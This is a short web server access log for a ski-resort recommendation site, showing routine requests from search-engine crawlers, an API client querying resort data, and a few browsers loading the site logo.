66.249.79.227 - - [21/Mar/2016:12:27:17 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-24&coords=46.5083%2C-87.42&size=7&sort=distance HTTP/1.1" 200 1377 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.234 - - [21/Mar/2016:12:27:17 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=marquette&dateStart=2016-03-22 HTTP/1.1" 200 702 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.33 - - [21/Mar/2016:12:32:12 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.31 - - [21/Mar/2016:12:33:07 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
52.33.40.213 - - [21/Mar/2016:12:38:42 -0700] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 1035 "-" "node-superagent/1.4.0"
108.80.57.174 - - [21/Mar/2016:12:46:31 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (X11; CrOS x86_64 7834.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.95 Safari/537.36"
108.80.57.174 - - [21/Mar/2016:12:49:51 -0700] "-" 408 0 "-" "-"
108.80.57.174 - - [21/Mar/2016:12:49:51 -0700] "-" 408 0 "-" "-"
107.77.75.112 - - [21/Mar/2016:12:51:00 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15"
52.33.40.213 - - [21/Mar/2016:12:51:33 -0700] "GET /lib/reccapi.php?resort=monarch HTTP/1.1" 200 976 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:12:51:53 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 1095 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:12:55:33 -0700] "GET /lib/reccapi.php?resort=bigwhite HTTP/1.1" 200 921 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:12:56:43 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 985 "-" "node-superagent/1.4.0"
